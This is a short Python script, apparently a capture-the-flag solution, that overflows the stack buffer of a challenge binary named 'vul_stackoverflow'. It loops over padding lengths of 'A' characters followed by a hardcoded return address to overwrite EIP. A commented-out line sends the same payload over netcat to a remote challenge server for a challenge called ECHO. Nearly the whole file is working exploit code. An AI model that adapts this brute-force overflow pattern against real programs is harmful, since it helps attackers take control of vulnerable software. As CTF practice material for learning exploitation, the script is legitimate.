#!/usr/bin/env python

'''
A super lazy script to perform stack buffer overflow and overwrite EIP
'''

import subprocess

program = './vul_stackoverflow'
target_address = '\xd4\x85\x04\x08'

for i in range(100):
	#print(i)
	subprocess.Popen([program], stdin = subprocess.PIPE, stderr = subprocess.PIPE).communicate('A'* i + target_address + '\n')[0]
	# If program is hosted remotely https://backdoor.sdslabs.co/challenges/ECHO
	#subprocess.Popen(['nc', 'hack.bckdr.in', '12001'], stdin = subprocess.PIPE, stderr = subprocess.PIPE).communicate('A'* i + '\x6B\x85\x04\x08' + '\n')[0]
